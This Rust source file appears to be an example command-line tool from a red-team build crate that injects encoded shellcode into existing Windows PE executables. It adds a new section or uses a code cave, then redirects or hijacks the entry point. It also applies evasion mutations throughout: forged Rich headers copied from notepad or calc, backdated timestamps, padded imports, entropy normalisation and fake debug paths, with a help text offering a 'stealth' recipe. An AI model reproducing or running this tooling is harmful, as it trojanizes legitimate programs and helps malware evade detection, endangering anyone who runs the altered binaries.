//! Inject encoded shellcode into an existing PE binary.
//!
//! Uses `PeInjector` to add a new section with a carrier stub + encoded payload,
//! then optionally applies binary mutations via `BinaryMutator`.
//!
//! Usage:
//!   cargo run -p build --example pe_inject -- --payload shellcode.bin --target hello_world.exe
//!   cargo run -p build --example pe_inject -- -p sc.bin -t target.exe --encoding xor --return-to-oep
//!   cargo run -p build --example pe_inject -- -p sc.bin -t target.exe -m binary.rich_header -m binary.timestamp
//!   cargo run -p build --example pe_inject -- -p sc.bin --target-dir data/injectables --list-targets

use build::EncodingType;
use build::mutator::MutationSpec;
use build::pe_inject::{
    InjectedArtifact, InjectionMode, PeInjectConfig, PeInjectInput, PeInjector, RedirectMode,
    scan_injectables_dir,
};
use std::path::PathBuf;
use std::str::FromStr;
use std::{env, fs, process};

fn main() {
    let args = Args::parse();

    if args.help {
        print_help();
        return;
    }

    // --list-targets mode: scan and print suitability report, then exit
    if args.list_targets {
        let default_dir = PathBuf::from("data/injectables");
        let dir = args.target_dir.as_ref().unwrap_or(&default_dir);
        let targets = scan_injectables_dir(dir).unwrap_or_else(|e| {
            eprintln!("Error scanning '{}': {}", dir.display(), e);
            process::exit(1);
        });
        if targets.is_empty() {
            eprintln!("No .exe files found in {}", dir.display());
            process::exit(0);
        }
        eprintln!(
            "{:<30} {:>10}  {:>8}  {:>7}  {:>8}  Status",
            "Target", "Size", "Cave", "Hijack", "Writable"
        );
        eprintln!("{}", "-".repeat(80));
        for t in &targets {
            let name = t
                .path
                .file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_default();
            let size_str = format_size(t.file_size);
            if t.valid {
                eprintln!(
                    "{:<30} {:>10}  {:>8}  {:>7}  {:>8}  {}",
                    name,
                    size_str,
                    format_size(t.largest_cave_bytes as u64),
                    if t.has_hijack_site { "yes" } else { "no" },
                    if t.has_writable_section_cave {
                        "yes"
                    } else {
                        "no"
                    },
                    format_args!("{} sections", t.num_sections),
                );
            } else {
                eprintln!(
                    "{:<30} {:>10}  {:>8}  {:>7}  {:>8}  INVALID: {}",
                    name,
                    size_str,
                    "-",
                    "-",
                    "-",
                    t.error.as_deref().unwrap_or("unknown"),
                );
            }
        }
        return;
    }

    let payload_path = match &args.payload {
        Some(p) => p.clone(),
        None => {
            eprintln!("Error: --payload / -p is required");
            eprintln!(
                "Usage: cargo run -p build --example pe_inject -- -p <PAYLOAD.bin> -t <TARGET.exe>"
            );
            process::exit(1);
        }
    };

    // Resolve target source: --target takes precedence over --target-dir
    let (target_pe_path, injectables_dir) = if let Some(t) = &args.target {
        (Some(t.clone()), None)
    } else if let Some(d) = &args.target_dir {
        (None, Some(d.clone()))
    } else {
        eprintln!("Error: either --target / -t or --target-dir is required");
        process::exit(1);
    };

    let payload = fs::read(&payload_path).unwrap_or_else(|e| {
        eprintln!("Error reading payload '{}': {}", payload_path.display(), e);
        process::exit(1);
    });

    eprintln!(
        "[pe_inject] Payload: {} ({} bytes)",
        payload_path.display(),
        payload.len()
    );
    if let Some(ref t) = target_pe_path {
        eprintln!("[pe_inject] Target PE: {}", t.display());
    }
    if let Some(ref d) = injectables_dir {
        eprintln!("[pe_inject] Target dir: {} (auto-select)", d.display());
    }

    let encoding = EncodingType::from_str(&args.encoding).unwrap_or_else(|e| {
        eprintln!("Error: {}", e);
        process::exit(1);
    });

    let mutations: Vec<MutationSpec> = args
        .mutations
        .iter()
        .map(|s| MutationSpec::from_cli_str(s))
        .collect();

    let config = PeInjectConfig {
        target_pe_path,
        injectables_dir,
        output_dir: args.output_dir.clone(),
    };

    let injector = PeInjector::new(config).unwrap_or_else(|e| {
        eprintln!("Error initializing injector: {}", e);
        process::exit(1);
    });

    let injection_mode = match args.injection_mode.as_str() {
        "section" | "new-section" => InjectionMode::NewSection,
        "cave" | "code-cave" => InjectionMode::CodeCave,
        "split" | "split-cave" => InjectionMode::SplitCave,
        other => {
            eprintln!(
                "Error: unknown injection mode '{}' (expected: section, cave, split)",
                other
            );
            process::exit(1);
        }
    };

    let redirect_mode = match args.redirect_mode.as_str() {
        "header" | "header-patch" => RedirectMode::HeaderPatch,
        "hijack" | "ep-hijack" => RedirectMode::EpHijack,
        other => {
            eprintln!(
                "Error: unknown redirect mode '{}' (expected: header, hijack)",
                other
            );
            process::exit(1);
        }
    };

    let sc_checkpoint_count = if args.checkpoints > 0 {
        Some(args.checkpoints)
    } else {
        None
    };

    let xwin_dir = args.xwin_dir.clone();

    let input = PeInjectInput {
        payload,
        encoding,
        binary_mutations: mutations,
        return_to_oep: args.return_to_oep,
        injection_mode,
        redirect_mode,
        sc_checkpoint_count,
        xwin_dir,
    };

    eprintln!(
        "[pe_inject] Encoding: {}, Return-to-OEP: {}, Injection: {:?}, Redirect: {:?}",
        args.encoding, args.return_to_oep, injection_mode, redirect_mode,
    );
    if !args.mutations.is_empty() {
        eprintln!("[pe_inject] Binary mutations: {:?}", args.mutations);
    }

    let artifact: InjectedArtifact = injector.inject(&input).unwrap_or_else(|e| {
        eprintln!("[pe_inject] Injection FAILED: {:#}", e);
        process::exit(1);
    });

    eprintln!("[pe_inject] --- Injection succeeded ---");
    eprintln!("[pe_inject] artifact_id:       {}", artifact.artifact_id);
    eprintln!("[pe_inject] target_pe:         {}", artifact.target_pe_name);
    eprintln!(
        "[pe_inject] size:              {} bytes",
        artifact.size_bytes
    );
    eprintln!(
        "[pe_inject] output:            {}",
        artifact.output_path.display()
    );
    eprintln!(
        "[pe_inject] original EP:       {:#x}",
        artifact.original_entry_point
    );
    eprintln!(
        "[pe_inject] injected section:  {:#x}",
        artifact.injected_section_rva
    );
    eprintln!(
        "[pe_inject] injection mode:    {:?}",
        artifact.injection_mode_used
    );
    eprintln!(
        "[pe_inject] redirect mode:     {:?}",
        artifact.redirect_mode_used
    );
    if let Some(ref sec) = artifact.cave_section {
        eprintln!("[pe_inject] cave section:      {}", sec);
    }
    eprintln!(
        "[pe_inject] mutations:         {:?}",
        artifact.mutations_applied
    );
    if artifact.checkpoint_count > 0 {
        eprintln!(
            "[pe_inject] checkpoints:       {}",
            artifact.checkpoint_count
        );
    }

    // Copy to user-specified output path
    if let Some(dest) = &args.output {
        fs::copy(&artifact.output_path, dest).unwrap_or_else(|e| {
            eprintln!("Error copying artifact to '{}': {}", dest.display(), e);
            process::exit(1);
        });
        eprintln!("[pe_inject] Copied -> {}", dest.display());
    }
}

fn format_size(bytes: u64) -> String {
    if bytes >= 1_048_576 {
        format!("{:.1} MB", bytes as f64 / 1_048_576.0)
    } else if bytes >= 1024 {
        format!("{:.1} KB", bytes as f64 / 1024.0)
    } else {
        format!("{} B", bytes)
    }
}

// -- Args --

struct Args {
    help: bool,
    payload: Option<PathBuf>,
    target: Option<PathBuf>,
    target_dir: Option<PathBuf>,
    list_targets: bool,
    output: Option<PathBuf>,
    encoding: String,
    return_to_oep: bool,
    mutations: Vec<String>,
    output_dir: PathBuf,
    injection_mode: String,
    redirect_mode: String,
    checkpoints: u32,
    xwin_dir: Option<PathBuf>,
}

impl Args {
    fn parse() -> Self {
        let mut a = Args {
            help: false,
            payload: None,
            target: None,
            target_dir: None,
            list_targets: false,
            output: None,
            encoding: "xor".into(),
            return_to_oep: false,
            mutations: vec![],
            output_dir: PathBuf::from("./artifacts"),
            injection_mode: "section".into(),
            redirect_mode: "header".into(),
            checkpoints: 0,
            xwin_dir: None,
        };
        let argv: Vec<String> = env::args().skip(1).collect();
        let mut i = 0;
        while i < argv.len() {
            match argv[i].as_str() {
                "--help" | "-h" => a.help = true,
                "--payload" | "-p" => {
                    i += 1;
                    a.payload = Some(PathBuf::from(&argv[i]));
                }
                "--target" | "-t" => {
                    i += 1;
                    a.target = Some(PathBuf::from(&argv[i]));
                }
                "--target-dir" => {
                    i += 1;
                    a.target_dir = Some(PathBuf::from(&argv[i]));
                }
                "--list-targets" => a.list_targets = true,
                "--output" | "-o" => {
                    i += 1;
                    a.output = Some(PathBuf::from(&argv[i]));
                }
                "--encoding" => {
                    i += 1;
                    a.encoding = argv[i].clone();
                }
                "--return-to-oep" => a.return_to_oep = true,
                "--mutation" | "-m" => {
                    i += 1;
                    a.mutations.push(argv[i].clone());
                }
                "--output-dir" => {
                    i += 1;
                    a.output_dir = PathBuf::from(&argv[i]);
                }
                "--injection-mode" => {
                    i += 1;
                    a.injection_mode = argv[i].clone();
                }
                "--redirect-mode" => {
                    i += 1;
                    a.redirect_mode = argv[i].clone();
                }
                "--checkpoints" => {
                    i += 1;
                    a.checkpoints = argv[i].parse().unwrap_or_else(|_| {
                        eprintln!("Error: --checkpoints must be a number");
                        process::exit(1);
                    });
                }
                "--xwin-dir" => {
                    i += 1;
                    a.xwin_dir = Some(PathBuf::from(&argv[i]));
                }
                other => {
                    eprintln!("Unknown argument: {}", other);
                    process::exit(1);
                }
            }
            i += 1;
        }
        a
    }
}

fn print_help() {
    eprintln!(
        r#"pe_inject — Inject shellcode into an existing PE binary

Adds a carrier stub + encoded payload, redirects execution, and optionally
applies binary mutations.

USAGE:
    cargo run -p build --example pe_inject -- -p <PAYLOAD> -t <TARGET> [OPTIONS]
    cargo run -p build --example pe_inject -- -p <PAYLOAD> --target-dir <DIR> [OPTIONS]
    cargo run -p build --example pe_inject -- --target-dir <DIR> --list-targets

REQUIRED (for injection):
    -p, --payload <FILE>            Raw .bin shellcode payload

TARGET (one of):
    -t, --target <FILE>             Host PE binary to inject into (x64 PE32+)
    --target-dir <DIR>              Directory of injectable PEs (auto-selects best
                                    target for payload size + mode).
                                    --target takes precedence if both specified.

OPTIONS:
    -h, --help                      Show this help
    --list-targets                  Scan --target-dir and print suitability report, then exit.
    -o, --output <FILE>             Copy final .exe to this path
    --encoding <TYPE>               xor | subbyte | none  (default: xor)
                                    NOTE: "english" is NOT supported for PE injection
    --return-to-oep                 Jump back to original entry point after shellcode
    -m, --mutation <ID[:params]>    Binary mutation to apply post-injection (repeatable)
    --output-dir <DIR>              Build output dir (default: ./artifacts)
    --injection-mode <MODE>         section | cave | split  (default: section)
                                    section: new ".extra" section (v1)
                                    cave:    code cave in existing section padding
                                    split:   (reserved, not yet implemented)
    --redirect-mode <MODE>          header | hijack  (default: header)
                                    header:  overwrite AddressOfEntryPoint
                                    hijack:  patch CALL/JMP in EP function body

BINARY MUTATIONS (applied after injection):
    binary.rich_header              Inject MSVC Rich header (param: donor=notepad|calc|explorer)
    binary.import_pad               Add benign imports (param: count=50)
    binary.resource_inject          Add version info + manifest
    binary.section_rename           Rename sections to MSVC defaults
    binary.timestamp                Backdate PE timestamp (params: age_days=365)
    binary.string_inject            Benign strings (consolidated)
    binary.entropy_normalize        Low-entropy padding (consolidated)
    binary.size_pad                 Pad PE to target size (consolidated)
    binary.debug_dir                Add fake PDB debug directory

EXAMPLES:
    # Basic XOR injection (v1 behavior)
    cargo run -p build --example pe_inject -- -p shellcode.bin -t hello_world.exe -o injected.exe

    # Auto-select best target from directory
    cargo run -p build --example pe_inject -- -p sc.bin --target-dir data/injectables -o injected.exe

    # List available targets with suitability info
    cargo run -p build --example pe_inject -- --target-dir data/injectables --list-targets

    # Stealth: code cave + EP hijack (no new section, no header EP change)
    cargo run -p build --example pe_inject -- -p sc.bin -t target.exe \
      --injection-mode cave --redirect-mode hijack --encoding none -o stealth.exe

    # No encoding, return to original entry point
    cargo run -p build --example pe_inject -- -p sc.bin -t target.exe --encoding none --return-to-oep

    # With binary mutations
    cargo run -p build --example pe_inject -- -p sc.bin -t target.exe \
      -m binary.rich_header:donor=notepad \
      -m binary.timestamp:age_days=180 \
      -o mutated.exe"#
    );
}
